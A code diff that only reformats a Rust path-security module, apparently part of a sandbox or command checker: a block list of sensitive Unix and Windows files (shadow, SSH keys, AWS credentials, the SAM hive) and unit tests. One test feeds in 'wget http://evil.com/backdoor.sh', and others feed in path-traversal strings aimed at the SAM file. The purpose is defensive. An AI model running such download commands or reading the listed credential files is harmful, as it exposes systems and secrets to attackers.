@@ -57,20 +57,43 @@ pub(crate) fn has_dangerous_traversal(path: &str) -> bool {
     }
 
     let sensitive_targets = [
-        "etc/", "shadow", "passwd", "hosts", "ssh/", ".ssh",
-        "sudoers", "crontab", "fstab", "resolv.conf",
-        "proc/", "sys/", "boot/", "dev/",
-        "root/", "var/log", "var/spool",
-        ".aws/", ".gpg/", ".gnupg/",
-        ".env", "id_rsa", "id_ed25519",
-        ".bash_history", ".zsh_history",
+        "etc/",
+        "shadow",
+        "passwd",
+        "hosts",
+        "ssh/",
+        ".ssh",
+        "sudoers",
+        "crontab",
+        "fstab",
+        "resolv.conf",
+        "proc/",
+        "sys/",
+        "boot/",
+        "dev/",
+        "root/",
+        "var/log",
+        "var/spool",
+        ".aws/",
+        ".gpg/",
+        ".gnupg/",
+        ".env",
+        "id_rsa",
+        "id_ed25519",
+        ".bash_history",
+        ".zsh_history",
     ];
     let sensitive_win = [
-        "windows\\", "Windows\\",
-        "system32\\", "System32\\",
-        "config\\sam", "config\\SAM",
-        "config\\system", "config\\SYSTEM",
-        "config\\security", "config\\SECURITY",
+        "windows\\",
+        "Windows\\",
+        "system32\\",
+        "System32\\",
+        "config\\sam",
+        "config\\SAM",
+        "config\\system",
+        "config\\SYSTEM",
+        "config\\security",
+        "config\\SECURITY",
         "WinSxS\\",
         "AppData\\Roaming\\",
         "NTUSER.DAT",
@@ -210,29 +233,41 @@ mod tests {
     #[test]
     fn test_urls_not_extracted_as_paths() {
         let paths = extract_paths("wget http://evil.com/backdoor.sh -O /tmp/x");
-        assert!(!paths.iter().any(|p| p.contains("://")),
-            "URLs should be filtered out, got: {:?}", paths);
+        assert!(
+            !paths.iter().any(|p| p.contains("://")),
+            "URLs should be filtered out, got: {:?}",
+            paths
+        );
         assert!(paths.iter().any(|p| p == "/tmp/x"));
     }
 
     #[test]
     fn test_https_url_not_extracted() {
         let paths = extract_paths("curl -s https://api.example.com/data > /tmp/out");
-        assert!(!paths.iter().any(|p| p.contains("://")),
-            "HTTPS URLs should be filtered, got: {:?}", paths);
+        assert!(
+            !paths.iter().any(|p| p.contains("://")),
+            "HTTPS URLs should be filtered, got: {:?}",
+            paths
+        );
         assert!(paths.iter().any(|p| p == "/tmp/out"));
     }
 
     #[test]
     fn test_windows_path_still_extracted() {
         let paths = extract_paths(r#"copy C:\Users\me\file.txt D:\backup\"#);
-        assert!(paths.iter().any(|p| p.contains("C:\\Users")),
-            "Windows paths should still be extracted, got: {:?}", paths);
+        assert!(
+            paths.iter().any(|p| p.contains("C:\\Users")),
+            "Windows paths should still be extracted, got: {:?}",
+            paths
+        );
     }
 
     #[test]
     fn test_glob_match() {
-        assert!(glob_match("data/sandbox/**", "data/sandbox/abc/work/out.txt"));
+        assert!(glob_match(
+            "data/sandbox/**",
+            "data/sandbox/abc/work/out.txt"
+        ));
         assert!(glob_match("**/.env", "project/backend/.env"));
         assert!(!glob_match("data/sandbox/**", "/etc/passwd"));
     }
@@ -247,8 +282,12 @@ mod tests {
 
     #[test]
     fn test_dangerous_traversal_windows_sam() {
-        assert!(has_dangerous_traversal(r"..\..\windows\system32\config\sam"));
-        assert!(has_dangerous_traversal(r"..\..\Windows\System32\config\SAM"));
+        assert!(has_dangerous_traversal(
+            r"..\..\windows\system32\config\sam"
+        ));
+        assert!(has_dangerous_traversal(
+            r"..\..\Windows\System32\config\SAM"
+        ));
     }
 
     #[test]
